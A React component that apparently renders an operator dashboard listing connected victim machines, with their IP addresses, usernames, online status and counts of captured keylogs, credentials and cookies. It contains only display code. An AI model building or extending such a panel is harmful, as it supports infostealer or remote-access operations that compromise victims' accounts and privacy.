import React, { useEffect } from "react";
import { Monitor, Key, Cookie, Keyboard, Clock, User } from "lucide-react";
import { GlobalContext } from "../App";

const MonitoringPanel = ({ className = "" }) => {
  const { clients, selectedClientId, setSelectedClientId } =
    React.useContext(GlobalContext);

  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleString();
  };

  return (
    <div
      className={`bg-white rounded-lg shadow-lg outline outline-gray-300 outline-1 p-6 ${className} h-full flex flex-col`}
    >
      <div className="flex items-center mb-6">
        <Monitor className="h-6 w-6 text-blue-600 mr-2" />
        <h2 className="text-xl font-bold text-gray-800">Connected Clients</h2>
      </div>

      <div className="space-y-4 overflow-y-auto flex-1">
        {clients.map((client) => (
          <div
            key={client.id}
            className={`border rounded-lg p-4 transition-colors ${
              selectedClientId === client.client_id
                ? "border-blue-500 bg-blue-100"
                : "border-gray-200 hover:bg-gray-50"
            }`}
            onClick={() => setSelectedClientId(client.client_id)}
          >
            <div className="flex justify-between items-start mb-3">
              <div>
                <div className="flex items-center">
                  <span className="font-mono text-lg font-semibold text-gray-800">
                    {client.client_id}
                  </span>
                  <div className="ml-3 flex items-center">
                    <div
                      className={`h-2 w-2 rounded-full ${
                        client.online ? "bg-green-500" : "bg-gray-400"
                      }`}
                    />
                    <span
                      className={`ml-1 text-sm ${
                        client.online ? "text-green-500" : "text-gray-500"
                      }`}
                    >
                      {client.online ? "Online" : "Offline"}
                    </span>
                  </div>
                </div>
                <div className="flex items-center mt-1">
                  <User className="h-3 w-3 text-gray-400 mr-1" />
                  <span className="text-sm text-gray-500">
                    {client.username}
                  </span>
                </div>
              </div>
              <div className="text-right">
                <div className="text-sm text-gray-500">{client.os}</div>
                <div className="text-sm font-mono text-gray-600">
                  {client.ip_address}
                </div>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-4 mb-3">
              <div className="flex items-center">
                <Keyboard className="h-4 w-4 text-blue-500 mr-2" />
                <div>
                  <div className="text-sm font-medium">{client.keylogs}</div>
                  <div className="text-xs text-gray-500">Keylogs</div>
                </div>
              </div>

              <div className="flex items-center">
                <Key className="h-4 w-4 text-amber-500 mr-2" />
                <div>
                  <div className="text-sm font-medium">
                    {client.credentials}
                  </div>
                  <div className="text-xs text-gray-500">Credentials</div>
                </div>
              </div>

              <div className="flex items-center">
                <Cookie className="h-4 w-4 text-purple-500 mr-2" />
                <div>
                  <div className="text-sm font-medium">{client.cookies}</div>
                  <div className="text-xs text-gray-500">Cookies</div>
                </div>
              </div>
            </div>

            <div className="flex items-center text-sm text-gray-500">
              <Clock className="h-4 w-4 mr-1" />
              <span>Last seen: {formatDate(client.last_seen)}</span>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default MonitoringPanel;
